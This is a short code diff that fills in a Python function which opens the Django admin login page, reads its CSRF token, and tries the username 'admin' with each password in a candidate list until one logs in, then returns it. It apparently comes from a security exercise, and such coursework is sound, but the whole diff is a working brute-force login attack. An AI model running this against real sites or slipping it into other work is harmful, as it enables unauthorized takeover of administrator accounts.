@@ -16,6 +16,25 @@ def isloggedin(response):
 
 
 def test_password(address, candidates):
+
+	session = requests.Session()
+
+	url = address + '/admin/login/?next=/admin/'
+	response = session.get(url)
+
+	csrf_token = extract_token(response)
+
+
+	for password in candidates:
+		logIn_Data = {
+			'username': 'admin',
+			'password': password,
+			'csrfmiddlewaretoken': csrf_token
+		}
+		response = session.post(url, data=logIn_Data)
+	
+		if isloggedin(response):
+			return password	
 	return None
 
 
